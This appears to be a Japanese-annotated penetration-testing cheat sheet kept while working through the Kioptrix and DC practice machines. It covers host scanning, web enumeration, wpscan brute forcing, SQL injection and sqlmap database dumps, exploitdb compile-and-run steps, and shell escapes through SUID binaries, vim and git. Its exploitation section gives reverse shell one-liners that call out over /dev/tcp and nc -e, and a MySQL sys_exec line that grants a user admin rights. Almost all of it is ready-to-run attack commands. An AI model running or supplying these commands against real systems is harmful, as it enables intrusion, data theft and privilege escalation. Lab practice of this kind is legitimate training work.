🐻 Kioptrix#1/#2/#3/#4 DC-1/DC-2

## Reconnaissance

ホスト確認

    nmap -sn [address]/24
    netdiscover -r [address]/24

ポート確認

    nmap -v -p 1-65535 -sV -sT -Pn [HOST]
    nmap -v -A [HOST]

Nmap Scripting Engine

    /usr/share/nmap/scripts #スクリプト所在
    nmap --script=smb-enum-* -p139,445 [address] #Samba

Webサーバ／[dirsearch](https://github.com/maurosoria/dirsearch)

    nikto -h [HOST]
    dirb http://XXX.com/
    python3 dirsearch.py -u http://XXX.com -e * -x 403,404

状態確認

    uname -a
    cat /etc/redhat-release
    cat /proc/version

SSH／認証鍵使わずに接続

     ssh -o PubkeyAuthentication=no user@10.0...

MySQL

     mysql -u root -p
     show databases;
     use ids;
     show tables;
     select * from idtable;

Samba

    smbclient //[address]/[dir] -U [user]

[SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

    ' or 1=1--

[LinEnum](https://github.com/rebootuser/LinEnum)

    ./LinEnum.sh -r repo -e /tmp/.le

 1. どのようなユーザが存在するか？
 2. 権限昇格を狙えるものはあるか？
 3. SUID／SGID(実行ファイル所有者権限実行)が存在しないか？
 4. 自ユーザで書き込める・アクセスできるものは何か？


wpscan

    wpscan -e u --url http://ip/ 
    wpscan --url http://ip/ -U ./ulist -P ./plist


[CeWL: Custom Word List Generator](https://github.com/digininja/CeWL)

    bundle install --path vendor/bundle
    bundle exec ./cewl.rb http://XXX/ -w passlist


## Delivery

http転送

    python -m SimpleHTTPServer 9998
    wget http://address:9998/file


## Exploitation

Spawning A TTY Shell

    echo os.system('/bin/bash')  #LShell
    /bin/sh -i
    python -c 'import pty; pty.spawn("/bin/bash")'
    ruby -e 'exec "/bin/bash"'
    find /etc/passwd -exec /bin/sh \;  #SUID


[bashリバースシェル](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

    nc -lvp 9999

    ;bash -i >& /dev/tcp/ip/9999 0>&1
    nc ip 9999 -e /bin/bash

[exploitdb](https://github.com/offensive-security/exploitdb)

    searchsploit CentOS 4.0
    cp /opt/exploitdb/exploits/linux_x86/local/XXX.c XXX.c
    gcc gcc XXX.c -o test
    ./test

sqlmap 

    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL #GET
    sqlmap -u "http://XXX.com/db.php" --method POST --data "id=XXX" #POST

    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL --dbs 
    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --tables 
    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --T [tb_name] --dump

[MySQL Root to System Root](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)

    use mysql;
    select * from func;
    select sys_exec('usermod -a -G admin [user]');

Bash

    echo $PATH
    export PATH=$PATH:/usr/bin

    sudo -l

Vi/Vim

    :set shell=/bin/bash
    :shell

Git

    git -p --help  #意図的にページャを開く
    !/bin/sh


